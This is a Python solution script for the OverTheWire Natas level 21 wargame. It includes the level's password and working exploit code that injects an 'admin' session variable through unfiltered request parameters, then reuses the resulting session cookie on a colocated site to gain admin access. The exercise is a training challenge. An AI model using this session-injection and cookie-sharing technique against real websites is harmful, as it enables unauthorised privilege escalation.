import requests
import bs4
import re


# configuration for natas21
USERNAME = 'natas21'
PASSWORD = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
URL = 'http://natas21.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
# response = session.get(URL + 'index-source.html')
# print(response.text)


# get the second site
SECOND_URL = re.search(r'href="(.+)"', str(div_content))[1] + '/'
response = session.get(SECOND_URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code for the second site
# response = session.get(SECOND_URL + 'index-source.html')
# print(response.text)


# since there is nothing interesting in the source code of the first webpage,
# we can safely skip it and go to the second website immediately
# in the second website, there is the following lines of code
"""

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
"""
# which will store any parameters that we submit to the webpage, including the admin parameter
# this is the main vulnerability.
# therefore, we can ignore the rest of the code that performs the validation


# part 1 of the attack
# we need to submit the admin parameter to the second website
# we can submit the admin parameter using either the post or get request
# the only key that the above lines of code searching for is the 'submit' key
# therefore, as long as we have the submit key, it doesn't matter what request method we use
params = {
    'admin' : '1',
    'debug' : '1',
    'submit' : '1'
}
response = session.get(SECOND_URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# since the first and second websites are colocated,
# if we get an admin access on the second website and we pass the cookie,
# PHPSESSID, to the first website,
# we can get the admin access as well on the first website
print(f'{session.cookies}\n')
# get the cookie from the second website
target_cookie = session.cookies.get_dict(domain='natas21-experimenter.natas.labs.overthewire.org')
# clear the session.cookies to remove the cookies from the first website
session.cookies.clear()
# get the first website using the cookies that we get from the second website
response = session.get(URL, cookies=target_cookie)
div_content = bs4.BeautifulSoup(response.text, "html.parser").body.find('div', {'id' : 'content'})
print(f'{div_content}\n')